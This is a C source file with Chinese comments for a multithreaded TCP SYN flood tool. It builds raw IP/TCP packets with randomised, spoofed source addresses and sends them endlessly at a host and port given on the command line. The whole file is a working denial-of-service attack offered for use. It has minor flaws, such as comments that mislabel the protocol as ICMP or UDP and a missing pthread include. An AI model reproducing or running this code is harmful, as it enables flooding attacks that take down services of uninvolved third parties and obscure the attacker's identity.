#include <stdio.h>
#include <ctype.h>
#include <unistd.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <errno.h>
#include <stdlib.h>
#include <time.h> 
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <string.h>

/* 最多线程数 */
#define MAXCHILD 2
/* 目的IP地址 */
static in_addr_t dest = 0;
static in_addr_t sour = 0;
static unsigned short dest_port = 0;
/* ICMP协议的值 */
static int PROTO_TCP = -1;
/* 程序活动标志 */
static alive = -1;

static int rawsock = -1;

typedef unsigned short u16;

/* 随机函数产生函数
*  由于系统的函数为伪随机函数
*	其与初始化有关，因此每次用不同值进行初始化
*/
static inline long 
	myrandom (int begin, int end)
{
	int gap = end - begin +1;
	int ret = 0;

	/* 用系统时间初始化 */
	srand((unsigned)time(0));
	/* 产生一个介于begin和end之间的值 */
	ret = random()%gap + begin;
	return ret;
}

struct pseudo_header    //needed for checksum calculation
{
    unsigned int source_address;//源地址
    unsigned int dest_address;//目的地址
    unsigned char placeholder;
    unsigned char protocol;//协议号
    unsigned short tcp_length;//tcp包长度

    struct tcphdr tcp;//tcp首部
};//一起计算校验和

/* CRC16校验 */
static unsigned short
	DoS_cksum (unsigned short *data, int length)     
{  
	register int left = length;  
	register unsigned short *word = data;  
	register int sum = 0;  
	unsigned short ret = 0;  

	/* 计算偶数字节 */
	while (left > 1)    
	{      
		sum += *word++;      
		left -= 2;    
	}  

	/* 如果为奇数,将最后一个字节单独计算
	*	剩余的一个字节为高字节构建一个short类型变量值
	*/
	if (left == 1)    
	{      
		*(unsigned char *) (&ret) = *(unsigned char *) word;      
		sum += ret;    
	}  

	/* 折叠 */
	sum = (sum >> 16) + (sum & 0xffff);  
	sum += (sum >> 16);  

	/* 取反 */
	ret = ~sum;  
	return (ret);
}


static void
	DoS_syn (void)
{ 
	
	/* 发送目的地址 */
	struct sockaddr_in to;  
	
	/* DOS结构,分为IP头部、UDP头部、UDP数据部分 */
	struct   dosseg_t 
	{      
		struct ip iph;      
		struct tcphdr tcph;      
		unsigned char data[8192];    
	}  dosseg;  

	memset(&dosseg, 0, sizeof(dosseg));
	/* IP的版本,IPv4 */
	dosseg.iph.ip_v = 4;  
	/* IP头部长度,字节数 */
	dosseg.iph.ip_hl = 5;  
	/* 服务类型 */
	dosseg.iph.ip_tos = 0;  
	/* IP报文的总长度 */
	dosseg.iph.ip_len = htons (sizeof(struct ip)+sizeof(struct tcphdr));  
	/* 标识,设置为PID */
	dosseg.iph.ip_id = htons (getpid ());  
	/* 段的便宜地址 */
	dosseg.iph.ip_off = 0; 
	/* TTL */
	dosseg.iph.ip_ttl = myrandom (128, 255);  ;  
	/* 协议类型 */
	dosseg.iph.ip_p = IPPROTO_TCP;  
	/* 校验和,先填写为0 */
	dosseg.iph.ip_sum = 0;  
	/* 发送的源地址 */
	struct in_addr ip;
	ip.s_addr = myrandom(0, 65535);;
	//ip.s_addr = sour;
	dosseg.iph.ip_src = ip;
	/* 发送目标地址 */
	ip.s_addr = dest;    
	dosseg.iph.ip_dst = ip;
	
 	dosseg.tcph.source=htons(myrandom(0,65535));
	dosseg.tcph.dest=htons(dest_port);
	dosseg.tcph.seq = htonl ((unsigned long) myrandom(0, 65535)); 
	dosseg.tcph.ack_seq = htonl((unsigned long)myrandom(0, 65535));  
	dosseg.tcph.syn = 1;
	dosseg.tcph.doff=5;
	dosseg.tcph.window = htons (myrandom(0, 65535));  
	dosseg.tcph.check = 0; 
	
	/* 填写发送目的地址部分 */
	to.sin_family =  AF_INET;  
	to.sin_addr.s_addr = dest;
	to.sin_port = htons(dest_port);
	
	struct  pseudo_header psh;
	psh.source_address = dosseg.iph.ip_src.s_addr;
	psh.dest_address =dosseg.iph.ip_dst.s_addr;
	psh.placeholder = 0;
	psh.protocol = IPPROTO_TCP;//TCP协议号
	psh.tcp_length = htons(sizeof(struct tcphdr));//TCP首部长度
	memcpy(&psh.tcp , &dosseg.tcph , sizeof (struct tcphdr));
	dosseg.tcph.check = DoS_cksum( (unsigned short*) &psh , sizeof (struct pseudo_header));
	dosseg.iph.ip_sum = DoS_cksum ((u16 *) &dosseg.iph, sizeof(dosseg.iph)+sizeof(dosseg.tcph));
	
	/* 发送数据 */
	int ret = sendto (rawsock, 
			&dosseg, 
			4 * dosseg.iph.ip_hl + sizeof (struct tcphdr) , 
			0, 
			(struct sockaddr *) &to, 
			sizeof (struct sockaddr));  	
	if(ret == -1){
		printf("sendto failed:errno=%d, errmsg=%s\n", errno, strerror(errno));
		return;
	}else{
		printf("send syn ok\n");
	}
}

static void
DoS_fun (unsigned long ip)
{  
	while(alive)
	{
		DoS_syn();
	}

}

/* 信号处理函数,设置退出变量alive */
static void 
DoS_sig(int signo)
{
	alive = 0;
}



int main(int argc, char *argv[])
{
	struct hostent * host = NULL;
	struct protoent *protocol = NULL;
	char protoname[]= "icmp";

	int i = 0;
	pthread_t pthread[MAXCHILD];
	int err = -1;
	
	alive = 1;
	/* 截取信号CTRL+C */
	signal(SIGINT, DoS_sig);



	/* 参数是否数量正确 */
	if(argc < 3)
	{
		printf("usage:dos_syn ip port\n");
		return -1;
	}

	/* 获取协议类型ICMP */
	protocol = getprotobyname(protoname);
	if (protocol == NULL)
	{
		perror("getprotobyname()");
		return -1;
	}
	PROTO_TCP = protocol->p_proto;

	/* 输入的目的地址为字符串IP地址 */
	dest = inet_addr(argv[1]);
	sour = inet_addr("172.19.50.199");
	if(dest == INADDR_NONE)
	{
		/* 为DNS地址 */
		host = gethostbyname(argv[1]);
		if(host == NULL)
		{
			perror("gethostbyname");
			return -1;
		}

		/* 将地址拷贝到dest中 */
		memcpy((char *)&dest, host->h_addr,host->h_length);
	}
	/* 目的端口 */
	dest_port = atoi(argv[2]);

	/* 建立原始socket */
	rawsock = socket (AF_INET, SOCK_RAW, protocol->p_proto);	
	if (rawsock < 0)	   
		rawsock = socket (AF_INET, SOCK_RAW, PROTO_TCP);	

	/* 设置IP选项 */
	setsockopt (rawsock, SOL_IP, IP_HDRINCL, "1", sizeof ("1"));

	/* 建立多个线程协同工作 */
	for(i=0; i<MAXCHILD; i++)
	{
		err = pthread_create(&pthread[i], NULL, DoS_fun, NULL);
	}

	/* 等待线程结束 */
	for(i=0; i<MAXCHILD; i++)
	{
		pthread_join(pthread[i], NULL);
	}

	close(rawsock);
	
	return 0;
}
